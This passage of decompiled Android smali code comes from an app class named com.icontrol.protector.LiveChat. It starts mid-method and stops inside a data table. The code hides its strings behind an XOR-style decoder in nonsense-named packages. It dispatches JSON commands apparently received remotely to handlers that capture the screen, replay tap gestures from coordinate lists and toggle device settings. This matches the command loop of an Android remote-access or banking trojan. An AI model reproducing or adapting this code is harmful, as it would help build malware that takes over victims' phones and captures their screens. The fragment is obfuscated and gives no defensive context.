    invoke-static {v0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    invoke-static {v0}, Lcom/icontrol/protector/ScreenCaps;->A(I)V

    goto/16 :goto_8

    :pswitch_1
    new-array v2, v4, [B

    fill-array-data v2, :array_1c

    new-array v4, v5, [B

    fill-array-data v4, :array_1d

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v7, [B

    fill-array-data v4, :array_1e

    new-array v6, v5, [B

    fill-array-data v6, :array_1f

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-array v2, v10, [B

    const/16 v4, 0x41

    aput-byte v4, v2, v15

    new-array v4, v5, [B

    fill-array-data v4, :array_20

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-static {}, Lcom/icontrol/protector/a;->n()V

    goto/16 :goto_8

    :cond_1
    new-array v2, v10, [B

    const/16 v4, -0x58

    aput-byte v4, v2, v15

    new-array v4, v5, [B

    fill-array-data v4, :array_21

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    invoke-static {}, Lcom/icontrol/protector/a;->r()V

    goto/16 :goto_8

    :pswitch_2
    new-array v2, v14, [B

    fill-array-data v2, :array_22

    new-array v4, v5, [B

    fill-array-data v4, :array_23

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v7, [B

    fill-array-data v4, :array_24

    new-array v6, v5, [B

    fill-array-data v6, :array_25

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/icontrol/protector/a;->o(Ljava/lang/String;)V

    goto/16 :goto_8

    :pswitch_3
    new-array v2, v13, [B

    fill-array-data v2, :array_26

    new-array v4, v5, [B

    fill-array-data v4, :array_27

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v7, [B

    fill-array-data v4, :array_28

    new-array v6, v5, [B

    fill-array-data v6, :array_29

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-array v2, v10, [B

    const/16 v4, -0x1e

    aput-byte v4, v2, v15

    new-array v4, v5, [B

    fill-array-data v4, :array_2a

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    invoke-static {v10}, Lcom/icontrol/protector/a;->b0(Z)V

    goto/16 :goto_8

    :cond_2
    new-array v2, v10, [B

    const/16 v4, 0x43

    aput-byte v4, v2, v15

    new-array v4, v5, [B

    fill-array-data v4, :array_2b

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    invoke-static {v15}, Lcom/icontrol/protector/a;->b0(Z)V

    goto/16 :goto_8

    :pswitch_4
    new-array v2, v5, [B

    fill-array-data v2, :array_2c

    new-array v4, v5, [B

    fill-array-data v4, :array_2d

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v7, [B

    fill-array-data v4, :array_2e

    new-array v6, v5, [B

    fill-array-data v6, :array_2f

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-array v2, v10, [B

    const/16 v4, -0x67

    aput-byte v4, v2, v15

    new-array v4, v5, [B

    fill-array-data v4, :array_30

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    invoke-static {v10}, Lcom/icontrol/protector/a;->v(Z)V

    goto/16 :goto_8

    :cond_3
    new-array v2, v10, [B

    const/4 v4, -0x2

    aput-byte v4, v2, v15

    new-array v4, v5, [B

    fill-array-data v4, :array_31

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    invoke-static {v15}, Lcom/icontrol/protector/a;->v(Z)V

    goto/16 :goto_8

    :pswitch_5
    new-array v2, v5, [B

    fill-array-data v2, :array_32

    new-array v4, v5, [B

    fill-array-data v4, :array_33

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v7, [B

    fill-array-data v4, :array_34

    new-array v6, v5, [B

    fill-array-data v6, :array_35

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-array v2, v10, [B

    aput-byte v3, v2, v15

    new-array v4, v5, [B

    fill-array-data v4, :array_36

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_4

    invoke-static {}, Lcom/icontrol/protector/a;->V()V

    goto/16 :goto_8

    :cond_4
    new-array v2, v10, [B

    aput-byte v13, v2, v15

    new-array v4, v5, [B

    fill-array-data v4, :array_37

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v0, :cond_a

    :goto_2
    if-ge v15, v7, :cond_a

    const-wide/16 v8, 0x1f4

    :try_start_1
    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :try_start_2
    invoke-static {}, Lcom/icontrol/protector/a;->V()V

    add-int/lit8 v15, v15, 0x1

    goto :goto_2

    :pswitch_6
    new-array v4, v5, [B

    fill-array-data v4, :array_38

    new-array v6, v5, [B

    fill-array-data v6, :array_39

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v6, v7, [B

    fill-array-data v6, :array_3a

    new-array v8, v5, [B

    fill-array-data v8, :array_3b

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v4, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    new-array v6, v10, [B

    const/16 v8, -0x5a

    aput-byte v8, v6, v15

    new-array v8, v5, [B

    fill-array-data v8, :array_3c

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_6

    new-array v2, v14, [B

    fill-array-data v2, :array_3d

    new-array v4, v5, [B

    fill-array-data v4, :array_3e

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v7, [B

    fill-array-data v4, :array_3f

    new-array v6, v5, [B

    fill-array-data v6, :array_40

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-array v2, v7, [B

    fill-array-data v2, :array_41

    new-array v4, v5, [B

    fill-array-data v4, :array_42

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    if-nez v2, :cond_5

    :try_start_3
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    new-array v0, v10, [B

    const/16 v4, -0x4e

    aput-byte v4, v0, v15

    new-array v4, v5, [B

    fill-array-data v4, :array_43

    invoke-static {v0, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v0

    new-array v4, v10, [B

    const/16 v6, 0x1c

    aput-byte v6, v4, v15

    new-array v6, v5, [B

    fill-array-data v6, :array_44

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v2

    sget-object v4, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    new-array v8, v14, [B

    fill-array-data v8, :array_45

    new-array v9, v5, [B

    fill-array-data v9, :array_46

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    new-array v7, v7, [B

    fill-array-data v7, :array_47

    new-array v8, v5, [B

    fill-array-data v8, :array_48

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    invoke-static {v0, v2}, Lcom/icontrol/protector/a;->y(II)Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto/16 :goto_8

    :catch_2
    move-exception v0

    :try_start_4
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    goto/16 :goto_8

    :cond_5
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/16 v2, 0x1b

    new-array v2, v2, [B

    fill-array-data v2, :array_49

    new-array v4, v5, [B

    fill-array-data v4, :array_4a

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    goto/16 :goto_8

    :cond_6
    new-array v6, v10, [B

    const/16 v8, 0x78

    aput-byte v8, v6, v15

    new-array v8, v5, [B

    fill-array-data v8, :array_4b

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_a

    new-array v4, v14, [B

    fill-array-data v4, :array_4c

    new-array v6, v5, [B

    fill-array-data v6, :array_4d

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v6, v7, [B

    fill-array-data v6, :array_4e

    new-array v7, v5, [B

    fill-array-data v7, :array_4f

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v4, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-array v4, v10, [B

    const/16 v6, -0x75

    aput-byte v6, v4, v15

    new-array v6, v5, [B

    fill-array-data v6, :array_50

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/util/regex/Pattern;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    array-length v0, v4

    new-array v6, v0, [Landroid/graphics/Point;

    move v7, v15

    :goto_3
    array-length v0, v4
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    if-ge v7, v0, :cond_7

    :try_start_5
    aget-object v0, v4, v7

    new-array v8, v10, [B

    const/16 v9, 0x39

    aput-byte v9, v8, v15

    new-array v9, v5, [B

    fill-array-data v9, :array_51

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0, v8, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    new-array v8, v10, [B

    const/16 v9, 0x4b

    aput-byte v9, v8, v15

    new-array v9, v5, [B

    fill-array-data v9, :array_52

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0, v8, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    new-array v8, v12, [B

    fill-array-data v8, :array_53

    new-array v9, v5, [B

    fill-array-data v9, :array_54

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    aget-object v8, v0, v15

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    aget-object v0, v0, v10

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    new-instance v9, Landroid/graphics/Point;

    invoke-direct {v9, v8, v0}, Landroid/graphics/Point;-><init>(II)V

    aput-object v9, v6, v7
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    goto :goto_4

    :catch_3
    move-exception v0

    :try_start_6
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_4
    add-int/lit8 v7, v7, 0x1

    goto :goto_3

    :cond_7
    const/16 v0, 0x44c

    invoke-static {v6, v0}, Lcom/icontrol/protector/a;->S([Landroid/graphics/Point;I)V

    goto/16 :goto_8

    :pswitch_7
    new-array v2, v13, [B

    fill-array-data v2, :array_55

    new-array v4, v5, [B

    fill-array-data v4, :array_56

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v7, [B

    fill-array-data v4, :array_57

    new-array v6, v5, [B

    fill-array-data v6, :array_58

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-array v2, v10, [B

    const/16 v4, 0x3d

    aput-byte v4, v2, v15

    new-array v4, v5, [B

    fill-array-data v4, :array_59

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_8

    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->E:Ljava/lang/String;

    sget-object v4, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_5
    invoke-static {v0, v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    goto/16 :goto_8

    :cond_8
    new-array v2, v10, [B

    const/16 v4, 0x2b

    aput-byte v4, v2, v15

    new-array v4, v5, [B

    fill-array-data v4, :array_5a

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->E:Ljava/lang/String;

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_5

    :pswitch_8
    new-array v2, v14, [B

    fill-array-data v2, :array_5b

    new-array v4, v5, [B

    fill-array-data v4, :array_5c

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v7, [B

    fill-array-data v4, :array_5d

    new-array v6, v5, [B

    fill-array-data v6, :array_5e

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-virtual {v2}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    sget-object v4, Lntidisestablish/neumonoul/floccinaucinih/ab;->F:Ljava/lang/String;

    invoke-static {v2, v4, v0}, Lntidisestablish/neumonoul/floccinaucinih/sq;->e(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_8

    :pswitch_9
    new-array v2, v14, [B

    fill-array-data v2, :array_5f

    new-array v4, v5, [B

    fill-array-data v4, :array_60

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v7, [B

    fill-array-data v4, :array_61

    new-array v6, v5, [B

    fill-array-data v6, :array_62

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/icontrol/protector/a;->W(Ljava/lang/String;)V

    goto/16 :goto_8

    :pswitch_a
    new-array v2, v9, [B

    fill-array-data v2, :array_63

    new-array v4, v5, [B

    fill-array-data v4, :array_64

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v7, [B

    fill-array-data v4, :array_65

    new-array v6, v5, [B

    fill-array-data v6, :array_66

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-array v4, v10, [B

    const/16 v6, -0x11

    aput-byte v6, v4, v15

    new-array v6, v5, [B

    fill-array-data v6, :array_67

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_9

    const/4 v4, 0x6

    new-array v2, v4, [B

    fill-array-data v2, :array_68

    new-array v4, v5, [B

    fill-array-data v4, :array_69

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const-string v4, " "

    invoke-virtual {v0, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/icontrol/protector/a;->s(Ljava/lang/String;)V

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_6
    invoke-static {v0}, Lcom/icontrol/protector/a;->i(Ljava/lang/Boolean;)V

    goto :goto_8

    :cond_9
    new-array v0, v10, [B

    const/16 v4, -0x2f

    aput-byte v4, v0, v15

    new-array v4, v5, [B

    fill-array-data v4, :array_6a

    invoke-static {v0, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_0

    goto :goto_6

    :goto_7
    new-array v2, v3, [B

    fill-array-data v2, :array_6b

    new-array v3, v5, [B

    fill-array-data v3, :array_6c

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_a
    :goto_8
    return-void

    :sswitch_data_0
    .sparse-switch
        0x4c -> :sswitch_a
        0x51 -> :sswitch_9
        0xd57 -> :sswitch_8
        0x1a714 -> :sswitch_7
        0x1a923 -> :sswitch_6
        0x1c8d3 -> :sswitch_5
        0x35efca -> :sswitch_4
        0x597c48d -> :sswitch_3
        0x6581e93 -> :sswitch_2
        0x8fd4432 -> :sswitch_1
        0x7ffda5f8 -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch

    :array_0
    .array-data 1
        0x46t
        0x1t
        -0x44t
        0x1ft
    .end array-data

    :array_1
    .array-data 1
        0x35t
        0x74t
        -0x22t
        0x7ct
        0x18t
        0xdt
        -0x52t
        0x54t
    .end array-data

    :array_2
    .array-data 1
        -0x55t
        -0x36t
        -0x1t
        0xft
        -0x76t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x32t
        -0x59t
        -0x71t
        0x7bt
        -0xdt
        -0x4t
        -0x6t
        0x5ft
    .end array-data

    :array_4
    .array-data 1
        -0xat
        -0x31t
        0x23t
        0x71t
        -0x33t
        0x48t
        -0x7ct
    .end array-data

    :array_5
    .array-data 1
        -0x7bt
        -0x5ct
        0x4at
        0x1dt
        -0x47t
        0x27t
        -0x16t
        0x55t
    .end array-data

    :array_6
    .array-data 1
        -0x78t
        -0x3ct
        -0x2t
        -0x31t
        -0x39t
        0x46t
        -0x12t
        0x6at
        -0x77t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x5t
        -0x51t
        -0x6et
        -0x56t
        -0x5ct
        0x29t
        -0x7et
        0x5t
    .end array-data

    :array_8
    .array-data 1
        0x66t
        -0x3bt
        -0x25t
        -0x76t
        -0x66t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x16t
        -0x5ct
        -0x58t
        -0x2t
        -0x1t
        -0x68t
        -0x3bt
        0x69t
    .end array-data

    :array_a
    .array-data 1
        -0x5dt
        0x51t
        -0x34t
        0x37t
        0x1at
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x3ft
        0x3dt
        -0x5dt
        0x54t
        0x71t
        -0x6ct
        0x5dt
        0x6ct
    .end array-data

    :array_c
    .array-data 1
        -0x77t
        0x76t
        0x2at
        0x1dt
    .end array-data

    :array_d
    .array-data 1
        -0x6t
        0x18t
        0x4bt
        0x6dt
        0x9t
        0x1ct
        0x38t
        -0x34t
    .end array-data

    :array_e
    .array-data 1
        0x21t
        -0x2at
        -0x3dt
    .end array-data

    :array_f
    .array-data 1
        0x57t
        -0x47t
        -0x51t
        0x6et
        0x46t
        0x5ft
        -0x1bt
        0x5t
    .end array-data

    :array_10
    .array-data 1
        -0x21t
        0x76t
        0x74t
    .end array-data

    :array_11
    .array-data 1
        -0x4ft
        0x17t
        0x2t
        0x4et
        -0x31t
        -0x54t
        -0x2et
        -0x14t
    .end array-data

    :array_12
    .array-data 1
        -0x5ct
        0x1t
        -0x2ct
    .end array-data

    :array_13
    .array-data 1
        -0x37t
        0x6et
        -0x5et
        -0x37t
        -0x23t
        -0x5ct
        -0x43t
        -0x14t
    .end array-data

    :array_14
    .array-data 1
        -0x7bt
        0x36t
    .end array-data

    nop

    :array_15
    .array-data 1
        -0x12t
        0x54t
        0x5ct
        -0x75t
        0x38t
        0x2t
        -0x51t
        -0x16t
    .end array-data

    :array_16
    .array-data 1
        0x7ct
        0x30t
        -0x44t
        -0x10t
        0x10t
        0x7dt
        -0xbt
        -0x11t
    .end array-data

    :array_17
    .array-data 1
        -0xat
        0x55t
        0x9t
        0x68t
        0x58t
        -0x28t
        0x2et
        0x0t
    .end array-data

    :array_18
    .array-data 1
        -0x20t
        0x46t
        0x58t
        -0x2at
    .end array-data

    :array_19
    .array-data 1
        -0x72t
        0x23t
        0x2ft
        -0x59t
        -0x53t
        -0x2ct
        0x5dt
        0x9t
    .end array-data

    :array_1a
    .array-data 1
        0xct
        0x3at
        0x1et
        -0x7ct
        0x5t
    .end array-data

    nop

    :array_1b
    .array-data 1
        0x69t
        0x57t
        0x6et
        -0x10t
        0x7ct
        -0x6dt
        0x32t
        0x52t
    .end array-data

    :array_1c
    .array-data 1
        0x3bt
        0xct
        0x8t
        -0x6at
    .end array-data

    :array_1d
    .array-data 1
        0x57t
        0x63t
        0x6bt
        -0x3t
        0x42t
        0x77t
        -0x41t
        0x67t
    .end array-data

    :array_1e
    .array-data 1
        -0x64t
        -0x46t
        0x75t
        0x46t
        -0x33t
    .end array-data

    nop

    :array_1f
    .array-data 1
        -0x7t
        -0x29t
        0x5t
        0x32t
        -0x4ct
        0x9t
        0x7at
        -0x27t
    .end array-data

    :array_20
    .array-data 1
        0x70t
        -0x18t
        -0x5t
        -0x2et
        0x3t
        -0x44t
        0x6ft
        0x53t
    .end array-data

    :array_21
    .array-data 1
        -0x68t
        0x0t
        0x76t
        0x27t
        -0x25t
        -0x4at
        -0x28t
        0x67t
    .end array-data

    :array_22
    .array-data 1
        0x1t
        -0x48t
        -0x7ct
    .end array-data

    :array_23
    .array-data 1
        0x6ft
        -0x27t
        -0xet
        -0x5t
        -0x32t
        -0x29t
        -0x4ct
        -0x1dt
    .end array-data

    :array_24
